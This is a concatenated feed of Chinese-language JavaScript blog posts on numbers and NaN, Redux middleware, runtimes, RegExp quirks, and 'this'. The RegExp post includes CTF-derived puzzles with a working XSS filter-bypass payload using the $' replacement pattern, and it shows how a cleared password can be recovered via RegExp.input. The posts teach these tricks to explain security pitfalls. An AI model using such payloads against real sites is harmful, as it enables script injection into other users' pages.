因此比較實際的做法是根據你的使用情境來決定這個誤差值是多少，例如說你拿來運算的輸入基本上都頂多到小數點後面第三位，例如說 1.283 或是 27.583 之類的，這時候你的誤差值挑個 1e-9 應該就滿夠的了。 但若是你需要精度更高的運算，就別用浮點數了，直接用其它套件會是更好的選擇，例如說 decimal.js 就是這樣的套件，而未來我們或許也有機會看到 JavaScript 原生支援這樣的功能。 關於浮點數的各種問題，如果你想知道各個程式語言是否有這個問題，可以參考這個網址就說明一切的網站：https://0.30000000000000004.com/ 如果你想更進一步了解背後的原理以及更多案例，可以參考我從小看到大的這篇文章：使用浮點數最最基本的觀念，以及你所不知道的 C 語言: 浮點數運算。 案例四：不是數字的數字不知道你有沒有在一些網站上面看過 NaN 這個字眼？ 在 JavaScript 中，當你對數字做一些「不是數字」的操作時，就會產生一個叫做 NaN 的東西： console.log(Number('abc')) // NaN console.log(500/undefined) // NaN NaN 的全名為 Not a Number，中文直翻的話就會變成：「不是數字」，不過我建議大家不要這樣去記它，因為它其實比較像是「一個特殊的數字，用來表示不合法的數字」，因為 NaN 的型別也是 Number： console.log(typeof NaN) // number 而且它還有一個神奇的特性，那就是它是整個 JavaScript 的世界中，唯一自己不等於自己的值（題外話，你要自己用 Proxy 或是 Object.defineProperty 做出一個類似的也是可以啦）： console.log(NaN === NaN) // false 但這個行為同樣也不是 JavaScript 自己發明的，而是前面提過的 IEEE 754 裡面所規定的，想知道原因的話可以去看：Why is NaN not equal to NaN? 底下的回答，最佳回答還有額外引用了一些 IEEE 754 成員的回答。 如果你要在 JavaScript 裡面偵測某個值是否是 NaN 的話，因為歷史包袱的關係，你有兩種方式： console.log(isNaN(NaN)) // true console.log(isNaN('abc')) // true console.log(Number.isNaN(NaN)) // true console.log(Number.isNaN('abc')) // false 第一個 isNaN 是存在於 global 上面的函式，它的規格是這樣（19.2.3 isNaN. p.468）： 簡單來說呢，如果傳進去的值不是數字，它會先轉換成數字型態，再來看是不是 NaN，所以傳入 &quot;abc&quot; 會先被轉成數字，就變成 NaN 了。 第二個則是 ES6 導入的 Number.isNaN，規格如下（21.1.2.4 Number.isNaN, p.508）： 這邊先檢查型態是不是數字，不是的話直接回傳 false，是的話再來檢查是不是 NaN。 那如果版本太舊，沒有 Number.isNaN 的話，該怎麼實作它的 polyfill 呢？我們可以參考corejs 的實作，運用了「自己不等於自己」這個特性： // `Number.isNaN` method // https://tc39.es/ecma262/#sec-number.isnan $(&#123; target: 'Number', stat: true &#125;, &#123; isNaN: function isNaN(number) &#123; // eslint-disable-next-line no-self-compare -- NaN check return number != number; &#125; &#125;); 結語在使用數字的時候，最常見的兩種錯誤大概就是沒注意到範圍跟型別，只要記住數字的儲存是有範圍的，未來就能避免自己寫出類似的 bug，在碰到浮點數跟大數的時候也要多加留意，小心提醒自己不要超出了範圍。 型別的話則是字串跟數字搞不清楚，導致相加或是比較的時候產生意料之外的結果，這些也都是自己應該注意到的部分，如果真的被型別搞得很亂，也可以考慮導入 TypeScript 之類的，在編譯時就會提醒你型別有問題。至於 Array.prototype.sort 的問題，大概每個新手都會踩到過一次，畢竟是真的滿違反直覺的。 最後，這篇其實只提到一些比較粗淺的部分，並沒有涉及更多 Number 相關的知識，例如說 0 其實有 +0 跟 -0，無限大也有分正無限大跟負無限大，也沒有講到背後的原理，例如說： Number.MAX_SAFE_INTEGER 怎麼計算出來的？ Number.MAX_VALUE 怎麼來的？ 浮點數誤差的詳細原理是什麼？在系統內是怎麼被儲存的？ 上面這些就要去看 IEEE 754 才能講得清楚，有些我自己也沒有弄得太懂，未來有機會的話再跟大家介紹。","link":"/2022/03/14/javascript-number/"},{"title":"[Javascript] redux 的 middleware 詳解","text":"之前寫了一篇文章簡單的筆記一下自己在看redux的心得，在這邊還是要再次推薦官方文件，因為寫的超級清楚。 但是之前在看官方文件的時候，middleware的地方沒有完全看懂，看到後面就霧煞煞了這次重看了一遍官方文件講middleware跟非同步操作的地方，邊看邊做筆記，總算是把middleware的實作原理弄懂了依照慣例分享一下心得 官方文件很棒的點就是這篇不只教你怎麼用，還從頭講起，讓你知道為什麼middleware會是現在這樣的形式。 #正文你在看了某些教學文章之後覺得redux實在是太棒了，於是開始採用redux做自己的產品可是此時此刻你突然想要做一個功能：logging，你想記錄每個action，以及執行action完以後store的改變該怎麼做呢？先從最簡單的方法開始吧！ ##第一次嘗試：最直覺的方法假設我們原本dispatch action的code是這樣寫 store.dispatch(addTodo('Use Redux')); 我們可以直接改成 let action = addTodo('Use Redux'); console.log('dispatching', action); store.dispatch(action); console.log('next state', store.getState()); ##第二次嘗試：包成函式但是第一種方法大家都知道不能這樣，因為程式裡面一定不只一個地方需要做這件事情那接下來怎麼辦呢？把它包成函式吧 function dispatchAndLog(store, action) &#123; console.log('dispatching', action); store.dispatch(action); console.log('next state', store.getState()); &#125; dispatchAndLog(store, addTodo('Use Redux')); 可是這樣子，你每個需要dispatch的地方都要import這個函式，有沒有更好的作法呢？ ##第三次嘗試：Monkeypatching什麼是Monkeypatch？大家可以自己估狗一下大意就是：在runtime的時候把某個東西換掉就像是你可以在你的chrome devtool裡面寫 console.log = function(text)&#123; alert(text); &#125; 這樣子原本會在console裡面出現的訊息，就會全部用alert顯示了那用在這裡我們要怎麼用呢？ //先把原本的存起來，因為之後會用到 let next = store.dispatch; //覆蓋掉現在的 store.dispatch = function dispatchAndLog(action) &#123; console.log('dispatching', action); //執行 next(action); console.log('next state', store.getState()); return; &#125;; //呼叫方式跟之前一樣 store.dispatch(addTodo('Use Redux')); 這樣子的話，原本的code完全不用更動，你只要在程式剛開始的地方把store.dispatch換掉就好了實在是輕鬆又愉快，但是我們很快就碰到了一個新的問題 如果我現在想要一個錯誤回報的機制怎麼辦？當dispatch出錯的時候，我想把錯誤傳回server 嗯…好問題我們可以把這兩個想做的事情獨立成兩個function，差不多像是這樣 function patchStoreToAddLogging(store) &#123; let next = store.dispatch; store.dispatch = function dispatchAndLog(action) &#123; console.log('dispatching', action); next(action); console.log('next state', store.getState()); return; &#125;; &#125; function patchStoreToAddCrashReporting(store) &#123; let next = store.dispatch; store.dispatch = function dispatchAndReportErrors(action) &#123; try &#123; next(action); &#125; catch (err) &#123; console.error('Caught an exception!', err); Raven.captureException(err, &#123; extra: &#123; action, state: store.getState() &#125; &#125;); throw err; &#125; &#125;; &#125; patchStoreToAddLogging(store); patchStoreToAddCrashReporting(store); 剛開始讀到這段的時候我就有點暈了，不太懂為什麼這樣子可以後面的不是會把前面的store.dispatch覆蓋掉嗎？後來再看幾次終於看懂，精髓就在於那個let next = store.dispatch;上面code的行為大概會是這樣： 執行第一個函式patchStoreToAddLogging(store); 現在的dispatch（redux真正發送action的函式）被保存起來 store.dispatch被換掉，換成dispatchAndLog這個函式，這個函式的行為會是：做紀錄並且呼叫原本的dispatch 執行第二個函式patchStoreToAddCrashReporting(store); 現在的dispatch（注意，已經變成dispatchAndLog這個函式了）被保存起來 store.dispatch被換掉，換成dispatchAndReportErrors這個函式，這個函式的行為會是：做紀錄並且呼叫原本的dispatc 好，接著若是我們呼叫dispatch(..)，看一下流程會怎麼走 因為剛剛被換掉，所以執行dispatchAndReportErrors 執行next(action)，而next就是之前保存的dispatch，就是dispatchAndLog 執行dispatchAndLog 做紀錄，然後執行next(action)，而next就是之前保存的dispatch，就是最原始的dispatch 執行最原始的dispatch，執行完畢以後跳回dispatchAndLog這個function 回到dispatchAndLog，印出改變後的state 回到patchStoreToAddCrashReporting，因為都沒有錯誤，所以不做任何事 結束 這樣子就達成我們middleware最重要的功能，可以讓action經過一層又一層的中間件，最後抵達store但是這樣子還是不夠好 ##第四次嘗試：把Monkeypatching藏起來之前我們都是直接把store.dispatch換掉，那如果我們不要直接換掉，而是傳回一個function，會發生什麼事？ function logger(store) &#123; let next = store.dispatch; // 之前的: // store.dispatch = function dispatchAndLog(action) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; 假設我們的crashReporter也改成這種形式，那我們就可以 store.dispatcher = logger(store); store.dispatcher = crashReporter(store); 其實只是把store.dispatcher抽出來，獨立在function外面而已但這樣做的好處就是，我們可以這樣 function applyMiddlewareByMonkeypatching(store, middlewares) // Transform dispatch function with each middleware. middlewares.forEach(middleware => store.dispatch = middleware(store) ); &#125; applyMiddlewareByMonkeypatching(store, [logger, crashReporter]); 但是這樣子其實只是把monkeypatch的地方抽出來而已，實際上還是在下一步，我們要把monkeypatch這個方法徹底移除掉 ##第五次嘗試：把monkeypatching移除掉為什麼我們要override dispatch？有一個很重要的因素就是，這樣才能不斷呼叫之前的dispatch function logger(store) &#123; // 這行超重要，有了這行才能達成chaining let next = store.dispatch; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; 如果少了那重要的一行，那就無法達成chaining的效果但其實除了這樣子寫，我們還有另外一個方法可以用我們可以接收一個next的參數，達到相同目的官方文件接著有點講太快了，咻咻咻就直接把最重要的一個部分講完我這邊試著把進度放慢，講更多細節的東西，其實就是差在currying這個概念 繼續剛剛講的，我們可以接收一個next的參數，就會變成這樣 function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; 可以看到跟之前長得很像，只是原本的next是放在裡面，現在變成參數傳進來那我們在使用的時候就變成 let dispatch = store.dispatch; dispatch = crashReporter(store, dispatch); dispatch = logger(store, dispatch); dispatch(addTodo('Use Redux')); function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; function crashReport(store, next) &#123; return function dispatchAndReportErrors(action) &#123; try &#123; return next(action); &#125; catch (err) &#123; console.error('Caught an exception!', err); throw err; &#125; &#125;; &#125; 差別在於函式裡面的let next = store.dispatch;被拿掉了我們的middleware函式logger跟crashReport變得更乾淨了點改成這樣之後，把我們原本的applyMiddleware也改掉，讓它符合新的寫法 function applyMiddleware(store, middlewares) &#123; let dispatch &#x3D; store.dispatch; middlewares.forEach(middleware &#x3D;&gt; dispatch &#x3D; middleware(store,dispatch) ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;); &#125; &#x2F;&#x2F;呼叫的方式一模一樣，只是差別在於這個function現在會回傳一個store applyMiddleware(store, [logger, crashReporter]); 接著我們回來看官方給的文件跟範例，跟現在我們寫的有哪邊不一樣第一個點是，logger跟crashReport我們是傳入兩個參數，但是官方的實現只傳入了一個用了一種叫做currying的技巧什麼是currying？就是把多個參數的函數切成很多只有一個參數的函數直接看範例比較了解： function max(a,b)&#123; return a>b?a:b; &#125; max(1,5); function maxCurrying(a)&#123; return function inner(b)&#123; return a>b?a:b; &#125; &#125; maxCurrying(1)(5); 有了基本概念以後，就可以把我們剛剛的logger函式也做這樣的改變 //可以跟原來的比較，發現只是多一層函數包住而已 function logger(store) &#123; return function wrapDispatchToAddLogging(next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; &#125; //ES6的寫法 const logger = store => next => action => &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; //原來的 function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; 在我當初看官方文件的時候，最困擾我的就是這一段因為之前很少用這種function回傳function又回傳function的寫法所以一下子被弄得頭昏眼花於是只好先找出不要那麼多層函數的方法，然後了解currying之後再去了解原本的code對我來說這樣子會比較容易啦，不然一下子跳太快 applyMiddleware就可以改成這樣 function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware => dispatch = middleware(store)(dispatch) //差在這裡而已 ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;); &#125; //原來的 function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware => dispatch = middleware(store,dispatch) //差在這裡而已 ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;); &#125; 其實做到這邊，就已經跟redux本身的實現有個八分像了事實上middleware的寫法其實就是redux要求的寫法最後來看一下官方提供的用法要怎麼用 import &#123; createStore, combineReducers, applyMiddleware &#125; from 'redux'; // applyMiddleware takes createStore() and returns // a function with a compatible API. // 注意到這邊，我們剛剛的寫法是：applyMiddleware(store, [logger, crashReporter]); // 這邊做了currying，所以把兩個參數變成兩個函數 // 本來我們是傳進陣列，這邊把陣列拿掉了，只要依序傳進去就好 let createStoreWithMiddleware = applyMiddleware( logger, crashReporter )(createStore); // Use it like you would use createStore() let todoApp = combineReducers(reducers); //用createStoreWithMiddleware取代原本的createStore let store = createStoreWithMiddleware(todoApp); ##總結在看官方文件的時候，一直到前面都還看得懂，只是一下突然跳到currying那邊因為對這個概念比較陌生，所以就暈頭轉向了後來下定決心一定要看懂，重新看一次之後，一行一行去理解是什麼意思、流程怎麼跑之後就比較清楚了 這邊大幅度參考官方範例，code也是直接抄來的，只是有做了一點小改變所以在這邊說明像是官方範例的applyMiddleware裡面，其實前面都有 middlewares = middlewares.slice(); middlewares.reverse(); reverse()是因為執行順序的關係，slice()是複製這個array但是為什麼要複製我就不知道了，是因為不要改到原本的參數嗎？ 總之，希望這篇文章能幫助到一些跟我一樣迷惑的初學者最後還是要推薦大家去看官方文件如果有哪邊寫錯，還麻煩留言或是寄信跟我說，感謝大家","link":"/2015/09/03/javascript-redux-middleware-details-tutorial/"},{"title":"從「為什麼不能用這個函式」談執行環境（runtime）","text":"我認為在理解 JavaScript 這個程式語言的時候，還需要認識到「執行環境（runtime）」這件事情，你心中的架構圖才會完整。有許多人並沒有意識到這一環，導致對於 JavaScript 或是一些技術的理解有認知上的差異；因此這一篇，就讓我們好好來談談執行環境。 附註：除了 runtime 叫做執行環境以外，execution environment 也叫做執行環境，但這兩個是完全不同的東西。為了避免歧義，底下會盡量用原文 runtime 這個詞。 另外，runtime 有許多意思，這邊的 runtime 比較像是 runtime environment 的意思。 存在又不存在的函式故事的主角小明在工作上接到了一個需求，那就是要把一個字串做 base64 編碼。 在 JavaScript 裡面，我們要怎麼把一個字串轉成 base64 編碼？有一個叫做 btoa 的函式可以做到這件事情，你可以打開 Chrome 的 devtool console，輸入以下程式碼： console.log(btoa('hello')) // aGVsbG8= 如果要把字串從 base64 轉回來，把函式名稱轉一下，變成 atob 即可： console.log(atob('aGVsbG8=')) // hello 有些人可能會跟我一樣好奇，為什麼函式要取做 atob 跟 btoa，我自己一開始很容易誤會 atob 的 b 代表 base64 的意思，所以是把東西轉成 base64，但其實正好相反，atob 是把字串從 base64 轉回來。 根據 Why were Javascript atob() and btoa() named like that? 的解答，a 是 ASCII 的意思，b 是 binary，而不是 Base64，所以 atob 指的是把 ASCII 的資料（也就是字串）轉成 binary，就是把 base64 編碼過的字串轉回原始的形式。 雖然說在 JavaScript 裡面無論是 atob 還是 btoa，接收的參數都是字串，沒有什麼 binary，因此上面的解釋看起來有點怪，但如果你把眼光放寬，不要侷限在 JavaScript 的話，就會變得比較合理。 舉例來說，base64 可以把任何二進位（binary）的資料轉成字串，這是它最有價值的地方。例如說你可能有用過 data URI，其中一個用法就是把圖片用 base64 編碼成字串。 因此，btoa 代表著 binary to ASCII，也就是把任何東西用 base64 來編碼，輸出會是一個 base64 編碼過的字串，atob 則相反，ASCII to binary，就是把 base64 編碼過的字串還原成原始的形式。 好，講了這麼多 base64 的東西以後，讓我們回到重點。 小明查到要用 atob 跟 btoa 以後，順利解決了工作上的需求，在網頁上完成了這個功能。過了兩個月，主管要他在一個用 Node.js 跑的伺服器上面也實作同樣的功能。 小明心想：「這有什麼難的？」，於是就一樣用了 btoa，可是這次卻出現了不同的結果，居然噴出了錯誤： Uncaught ReferenceError: btoa is not defined 小明百思不得其解，為什麼同樣的函式，之前可以用，現在卻不能用了？難道這個函式同時存在也不存在於 JavaScript 之中？ 會發生這件事情，就是因為小明心中並沒有 runtime 的概念。 什麼是 runtime？JavaScript 是一個程式語言，所以像 var、if else、for 或是 function 等等，這些都是 JavaScript 的一部分。但是除了語言本身以外，JavaScript 需要有地方執行，而這個地方就叫做執行環境（runtime），舉個例子，大家最常用的 runtime 就是「瀏覽器」。 所以你的 JavaScript 是在瀏覽器這個 runtime 上執行的，而這個 runtime 會提供給你一些東西使用，例如說 DOM（document）、console.log、setTimeout、XMLHttpRequest 或是 fetch，這些其實都不是 JavsScript（或是更精確地說，ECMAScript）的一部分。 這些是瀏覽器給我們使用的，所以我們只有在瀏覽器上面執行 JavaScript 時才能使用。開頭時小明所使用的 atob 跟 btoa 也是，這兩個函式並不是 ECMAScript 規格中的一部份，而是瀏覽器提供給 JavaScript 的，這也是為什麼我們在使用 Node.js 時，就突然沒辦法用了，因為 Node.js 這個 runtime 並沒有提供這兩個函式。 以下圖為例，左邊是 Node.js 這個 runtime，中間是 JS 本身的東西，右邊則是瀏覽器這個 runtime，各有各的東西： 因此你可能有過類似的經驗，想說為什麼一樣的 code 搬到 Node.js 去就沒辦法執行。現在你知道了，那是因為 Node.js 並沒有提供這些東西，例如說 document 或是 atob，你沒辦法直接在 Node.js 裡面使用它（如果可以，那就代表你有用其它 library 或是 polyfill）。 相反過來也是，你用 Node.js 執行一段 JavaScript 程式碼時，你可以用 process 或是 fs，但你在瀏覽器上面就沒辦法。不同的 runtime 會提供不同的東西，你要很清楚現在是在哪個 runtime。 該如何分辨某個功能是 runtime 提供的，還是 JS 內建的？靠著一個原則，就可以有大概八成的機率分辨正確，那就是：「這個功能是否跟 runtime 本身有關？」 舉例來說，DOM 跟 BOM 這兩組 API，就跟瀏覽器有很大的關係。在使用 Node.js 這個 runtime 時，我們不會有 document，因為根本沒有所謂的頁面，也不會有 localStorage，因為那是瀏覽器才有的東西，所以像是 document 跟 localStorage，都是瀏覽器給的，而不是 JavaScript 這個語言本身的東西。 又或者像是 process，可以讀到許多執行緒相關的資訊，瀏覽器不可能讓你做這種事情，所以顯然在瀏覽器上面無法使用，是 Node.js 這個 runtime 專屬的東西。 而另外兩成就是一些例外了，看起來與 runtime 無關，但其實有關。例如說 btoa，只是轉成 Base64 而已，跟 runtime 有什麼關係？可是好巧不巧，它就是由 runtime 所提供的。 還有 console，這其實也是 runtime 提供的，而且有個特性要注意，那就是有時候不同的 runtime 會提供相同的東西。例如說 console 跟 setTimeout，在瀏覽器以及 Node.js 都有，可是他們都不是 JavaScript 的一部份，而是 runtime 提供的。 但儘管他們看起來一樣，內部實作卻是完全不同，表現方法也可能不同。舉例來說，瀏覽器的 console.log 會輸出在 devtool 的 console，而 Node.js 則是會輸出在你的 terminal 上面。 setTimeout 跟 setInterval 也是，雖然說瀏覽器跟 Node.js 都有，可是背後的實作卻完全不同。 如果你想確認一個 API 是不是 runtime 提供的，有個簡單又正確的方式，那就是去找 ECMAScript 的規格或是 MDN 來看。以 atob 為例，MDN 下方 Specifications 的段落中，你可以看見它的出處是 HTML Standard，並不是 ECMAScript，就代表它並不是 ECMAScript 的一部分： 簡單來說呢，只要你在 ECMAScript 的規格上找不到它，就代表它是由 runtime 所提供的。 在 MDN 上面，這些並不是由 ECMAScript 原生提供，而是由瀏覽器所提供的 API，叫做 Web API：https://developer.mozilla.org/en-US/docs/Web/API 底下我列幾個比較常誤會是 JavaScript 的一部分，但其實是 runtime 提供的 API： console fetch performance URL setTimeout setInterval 從不同 runtime 學習 JavaScript有許多人在學習 JavaScript 時，第一個碰到的都是瀏覽器，而且說不定會留下：「JavaScript 只能在瀏覽器上執行」這個印象。 除了瀏覽器以外，JavaScript 還有另一個 runtime 叫做 Node.js，官網上的介紹是： Node.js® is a JavaScript runtime built on Chrome’s V8 JavaScript engine. 透過 Node.js 這個 runtime，我們的 JavaScript 程式碼可以脫離瀏覽器執行。我很推薦大家都去看一下 Node.js，使用一下它提供的 API，像是 process 或是 fs 之類的，寫一點小玩具出來。 當你熟悉不同的 runtime 以後，你會發現 runtime 除了會提供更多 API 以外，它同時也是個限制器。 當你的 runtime 是瀏覽器時，你可以做的功能自然而然就會受到瀏覽器限制。舉例來說，你不能「主動讀取」電腦中的檔案，因為瀏覽器基於資安上的考量，不讓你做這件事情。你也不能把電腦重新開機，因為瀏覽器不讓你這樣做。在進行網路相關操作的時候，也會受到同源政策跟 CORS 的限制，這些都是瀏覽器這個執行環境才有的限制。 上面講的這些限制，一旦你換了個 runtime，就都沒問題了。使用 Node.js 來執行程式碼時，你可以讀取檔案，可以把電腦重開機，也沒有什麼同源政策跟 CORS 這些限制，你想幹嘛就幹嘛，想發送 request 給誰就給誰，response 都不會被攔截住。 之所以建議大家去學習 Node.js，是為了讓大家清楚意識到自己在執行程式碼時，所受的限制是誰給的限制。是 JavaScript 本身的限制，還是 runtime 給的限制？ 意識到這點以後，就會對 JavaScript 的認知更為全面。 結語當你在使用 JavaScript 時，有些 API 是這個語言本身內建的，例如說 JSON.parse 或是 Promise，你可以在 ECMAScript 的規格書中找到他們的說明。 而有些 API 則是 runtime 提供的，例如說 atob、localStorage 或是 document，就是瀏覽器所提供的 API，一旦脫離了瀏覽器這個 runtime，你就沒有這些 API 可以用。 但這並不代表在瀏覽器跟在 Node.js 這兩個 runtime 上面都可以使用的 API，就是語言內建的 API。舉例來說，console 以及 setTimeout 還有最近 Node.js 也要原生支援的 fetch，在瀏覽器以及 Node.js 上面都可以使用，可是它們都是 runtime 提供的， 也就是說，瀏覽器實作了 console 與 setTimeout 的 API，時做了計時器的機制，並且提供給 JavaScript 使用，而 Node.js 也實作了同樣的 API，也提供給 JavaScript 使用。雖然說表面上看起來是同一個 function，但背後的實作卻不同，這就好像你去全家可以買到鮪魚飯糰，你去 711 也可以買到鮪魚飯糰，雖然說都是鮪魚飯糰，但背後的供應商其實不一樣，製作方法也不同。 有了 runtime 的概念之後，以後如果碰到某個 function 在瀏覽器可以用，但是在 Node.js 上不能用，你就知道是為什麼了。","link":"/2022/02/09/javascript-runtime/"},{"title":"JavaScript 中 RegExp 與字串取代的神奇特性","text":"簡單記錄幾個最近碰到的神奇特性，直接講不有趣，先來幾個小挑戰： 挑戰一猜猜底下程式碼的執行結果是什麼？ var regexp = /huli/g var str = 'blog.huli.tw' var str2 = 'example.huli.tw' console.log(regexp.test(str)) // ??? console.log(regexp.test(str2)) // ??? 挑戰二先讓你輸入一個密碼，然後讓你輸入一段程式碼，可以拿到已經不見的變數嗎？ var password = prompt('input password') while (!/^[a-zA-Z0-9]+$/.test(password)) &#123; console.log('invalid password') password = prompt('input password') &#125; password = '' // 如果可以在底下動態執行程式碼，拿得到 password 嗎？ eval(prompt('try to get password')) 挑戰三底下的寫法會出事嗎？會的話是出什麼事？怎麼觸發？ var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl 有狀態的 RegExp猜猜底下程式碼的執行結果是什麼？ var regexp = /huli/g var str = 'blog.huli.tw' var str2 = 'example.huli.tw' console.log(regexp.test(str)) // ??? console.log(regexp.test(str2)) // ??? 無論是誰來看都會覺得兩個都是 true 吧？但答案是 true 跟 false，甚至你寫成這樣，第二個也是 false： var regexp = /huli/g var str = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.test(str)) // false 會有這樣的結果，是因為 RegExp 是 stateful 的，如果有 global 或是 sticky 的 flag 的話。 RegExp 有一個 lastIndex 的屬性，會記錄上次符合的位置，下次再使用 test 時就會從 lastIndex 開始找起。如果找不到的話，lastIndex 會自動歸零。 var regexp = /huli/g var str = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.lastIndex) // 9，因為 str[5..8] 是配對到的 'huli' console.log(regexp.test(str)) // false console.log(regexp.lastIndex) // 0，因為找不到所以自動歸零 console.log(regexp.test(str)) // true，此時再找一次就可以找到了，因為 lastIndex 是 0 console.log(regexp.lastIndex) // 9 所以根據上面所講的 lastIndex 的特性，這樣乍看之下是沒問題的： var regexp = /huli/g var str = 'huli.tw' var str2 = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.test(str2)) // true 但並不代表沒有 bug。 上面這一段之所以看起來沒問題，只是因為第一次找完以後 lastIndex 是 4，而剛好 str2 中 huli 出現的位置是從 5 開始，所以一樣找得到，如果把最後兩行位置對調，就會產生預期外的結果。 總之呢，在使用 global RegExp 的時候要小心這個特性。而對資安來說，則是可以關注這些潛在的 bug，看看有沒有能利用的地方。 RegExp 的神奇紀錄屬性延續開頭的小挑戰： var password = prompt('input password') while (!/^[a-zA-Z0-9]+$/.test(password)) &#123; console.log('invalid password') password = prompt('input password') &#125; password = '' // 如果可以在底下動態執行程式碼，拿得到 password 嗎？ eval(prompt('try to get password')) 變數已經被清空了，所以是拿不到變數的。 但我們可以靠著 RegExp 上的一個神奇屬性來拿到，叫做：RegExp.input，這個屬性會紀錄上一次 regepx.test() 符合時的 input： /hello/.test('hello world') console.log(RegExp.input) // hello world console.log(RegExp.$_) // 同上 除此之外，還有其他參數也會被記錄： RegExp.lastMatch ($&amp;) RegExp.lastParen ($+) [RegExp.leftContext ($&#96;)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext) RegExp.rightContext ($’) 第一次知道這技巧是在 DiceCTF 2022 - web&#x2F;nocookies RegExp 的特殊變數開頭的挑戰三中我們給出了底下這段程式碼： var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl 雙引號被濾掉了，所以照理來說應該沒辦法跳脫出屬性才對，&gt; 也被拿掉了，所以也沒辦法關閉標籤。 但是呢，在做字串取代的時候，有種東西叫做：special replacement patterns，舉例來說 $&amp;#x60; 可以拿到字串取代的地方的「前面」，$&#39; 則是可以拿到後面，看個範例會更容易理解： const str = '123&#123;n&#125;456' // 123A456 console.log(str.replace('&#123;n&#125;', 'A')) // 123123A456，原本 &#123;n&#125; 的地方變成 123A console.log(str.replace('&#123;n&#125;', \"$`A\")) // 123456A456，原本 &#123;n&#125; 的地方變成 456A console.log(str.replace('&#123;n&#125;', \"$'A\")) 因此回到我們的題目： var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl ｛{value}} 的後面是 &quot;&gt;，雖然這兩個字元都被過濾掉，但我們可以用 $&#39; 來拿到這兩個字元。 因此這題的答案是 $&#39;&lt;style onload=alert(1) ： var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = \"$'&lt;style onload=alert(1) \" value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl 先用 $&#39; 也就是 &quot;&gt; 來關閉標籤，就可以用其他標籤進行 XSS，最後產生的結果是： &lt;input type=\"submit\" value=\"\">&lt;style onload=alert(1) \"> 我第一次知道這個是在 PlaidCTF 2022 - YACA，但在 DragonCTF 2021 - Webpwn 中似乎也出現過類似的技巧。","link":"/2022/04/14/javascript-string-regexp-magic/"},{"title":"淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂","text":"前言在 JavaScript 裡面，有一個令新手十分頭痛，老手也不一定能完全理解的主題：「this 是什麼？」。身為一個以 JavaScript 當作吃飯工具的前端工程師，我也被這個問題困擾了許久。 我原本以為我這輩子都不會寫有關於 this 的文章。 原因有兩個，第一個是講解 this 的文章已經超級無敵多了，而且每一篇都寫得很不錯，之前看完 What’s THIS in JavaScript ? 系列之後覺得講解的很完整，若是沒有把握自己能夠講得更清楚或是以不同的角度切入，似乎就沒必要再寫一篇文章；第二個原因是若是想要「完全」搞懂 this，要付出的成本可能比你想像中要大得多。 這裡所說的「完全」指的是無論在任何情況下，你都有辦法講出為什麼 this 的值是這樣，直接給大家一個範例： var value = 1; var foo = &#123; value: 2, bar: function () &#123; return this.value; &#125; &#125; //範例1 console.log(foo.bar()); //範例2 console.log((foo.bar)()); //範例3 console.log((foo.bar = foo.bar)()); //範例4 console.log((false || foo.bar)()); //範例5 console.log((foo.bar, foo.bar)()); 你能答的出來嗎？如果不行的話，代表你沒有「完全」懂 this。要完全懂 this 之所以要付出的成本很大，就是因為「完全懂 this」指的就是「熟記 ECAMScript 規範」。this 的值是什麼不是我們憑空想像的，其實背後都有完整的定義，而那個定義就是所謂的 ECMAScript 規範，你必須先搞懂這個規範，才有可能完全理解 this 在每個情況下所指涉的對象。 若是你真的很想完全搞懂，推薦你這一篇：JavaScript深入之从ECMAScript规范解读this，我上面的範例就是從這一篇拿來的，想看解答、想理解為什麼的話可以去看這一篇。 既然我前面提了這麼多讓我不寫 this 的理由，怎麼最後我還是跳下來寫了？ 因為，在我看了這麼多的文章，吸取了一大堆日月精華並且思考過後，發現如果有個不錯的切入點，或許就可以讓 this 變得不是這麼難懂。以我這篇教的方法，不會讓你把 this 完全搞懂，上面那五個範例你可能會答錯，但基本的題目你依舊可以解的出來。 這也是標題的由來：「絕對不完整，但保證好懂」，此文的目的是希望提供一個不同的角度來看 this，從為什麼會有 this 下手，再用一套規則來解釋 this 的值，至少讓你不再對 this 有誤解，也會知道一些常見的情境底下 this 到底是什麼。 要談 this，要從物件導向開始談（若是你對 JavaScript 的物件導向完全沒概念，你可以先補完相關基礎，並且看完這篇：該來理解 JavaScript 的原型鍊了） 如果你有寫過其他程式語言，你就知道 this 